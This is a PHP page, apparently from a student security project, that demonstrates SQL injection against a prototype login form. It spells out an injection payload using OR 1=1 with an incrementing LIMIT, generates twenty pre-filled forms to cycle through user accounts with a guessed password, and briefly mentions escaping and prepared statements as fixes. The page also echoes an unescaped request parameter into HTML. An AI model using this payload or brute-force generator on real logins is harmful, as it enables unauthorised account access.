<?php
include_once(dirname(__FILE__) . "/../include/config.php");
include_once(INCLUDE_DIR . "/" . "htmlFunctions.php");
include_once(INCLUDE_DIR . "/" . "mitigate.php");
include_once(INCLUDE_DIR . "/" . "FYP_functions.php");



$password = 'password';


if (isset($_GET['password'])) {
	$password = $_GET['password'];
}



?>

<!DOCTYPE html>
<html>
<head>
	<title>SQL Injection Attack</title>
	<link type="text/css" href="style.css" rel="stylesheet" />
</head>
<body>
<div id="wrapper" >

	<h1>SQL Injection attack</h1>

	<h2>Brute Force</h2>

	<p>This string '<code>dud' or 1 = 1 or email = 'hacked' LIMIT 1,1 -- </code>' can be inserted as the username when logging in. 
		We can increment the LIMIT counter which will allow us to cycle through every user in the database, and try a common password, and see if 
		someone has used it. eg. 'password'</p>

		<h2>Mitigate</h2>
		<p>To escape this and not allow the user  to carry out these operations, we must escape the special charachters. It is also a good idea to use prepared statements.</p>

		<h2>First 20 Examples</h2>

		
		<?php 





		for ($i=0; $i < 20; $i++) { 
			echo '<form action="../'.PROTOTYPE.'/login.php" method="post" >';
			
			$value = "dud' or 1 = 1 or email = 'hacked' LIMIT {$i},1; -- ";

			echo "<p><strong>Value</strong>: <code>{$value}</code></p>";

			echo '<div>';
			echo '<label for="email" >Email:</label>';
			echo '<input type="text" name="email" id="email" size="50" value="'.$value.'" />';
			echo "</div>";

			echo "<div>";
			echo '<label for="pass" >Password:</label>';
			echo '<input type="text" name="pass" id="pass" value="'.$password.'" />';
			echo "</div>";

			echo "<div>";
			echo '<input type="submit" value="Try" />';
			echo "</div>";
			echo "</form>";
		}
		?>

</div>

	</body>
	</html>
<!--
dud'or 1 = 1 or email = 'hacked

WIN!


SELECT * FROM user_info WHERE email = 'dud'or 1 = 1 or email = 'hacked' LIMIT 1,1


Can increment first argument of limit by one every time, until they find a match for a guessed password -  'password'


<form action="login.php" method="post" >
			<div>
				<label for="email" >Email:</label>
				<input type="text" name="email" id="email" />
			</div> 		
		
			<div>
				<label for="pass" >Password:</label>
				<input type="password" name="pass" id="pass" />
			</div> 
			
			<div>			
				
				<input type="submit" value="Login!" />
			</div> 		
		</form>









-->